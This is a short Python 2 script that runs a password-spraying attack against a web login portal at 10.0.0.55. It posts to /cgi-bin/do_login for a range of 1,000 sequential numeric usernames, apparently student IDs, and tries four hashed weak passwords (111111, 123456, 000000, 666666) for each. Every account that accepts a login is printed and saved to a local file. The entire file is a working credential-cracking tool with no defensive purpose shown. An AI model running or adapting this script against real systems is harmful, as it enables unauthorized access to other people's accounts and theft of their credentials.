import pycurl
import StringIO
import urllib

b = StringIO.StringIO()
c = pycurl.Curl()
host_address = '10.0.0.55'
password_list = ['965eb72c92a549dd', '49ba59abbe56e057', '8ad9902aecba32e2', 'c831b04de153469d']#111111, 123456, 00000, 666666
map_list = {'965eb72c92a549dd':'111111', '49ba59abbe56e057':'123456', '8ad9902aecba32e2':'000000', 'c831b04de153469d':'666666'}

def reset():
    b.truncate(0)
    c.reset()
    c.setopt(pycurl.WRITEFUNCTION, b.write)

def login(host, username, password):
    reset()
    c.setopt(pycurl.URL, 'http://%s/cgi-bin/do_login' % host)
    c.setopt(pycurl.POST, True)
    c.setopt(pycurl.POSTFIELDS, urllib.urlencode({
        'username': username,
        'password': password,
        'n': '100',
        'type': '1',
        'drop': '0',
    }))
    c.perform()
    return b.getvalue()

def logout(host, uid):
    reset()
    c.setopt(pycurl.URL, 'http://%s/cgi-bin/do_logout' % host)
    c.setopt(pycurl.POST, True)
    c.setopt(pycurl.POSTFIELDS, urllib.urlencode({
        'uid': uid,
    }))
    c.perform()
    return b.getvalue()

def crack():
    file_obj = open("psw_list", 'w+')
    for i in range(1120131000, 1120132000):
        username = str(i)
        for j in password_list:
            password = j
            response = login(host_address, username, password)
            if response.isdigit() or response == 'ip_exist_error':
                line = username + "&" + map_list[password] + "\n"
                print "Found %s" % line
                file_obj.write(line)

crack()
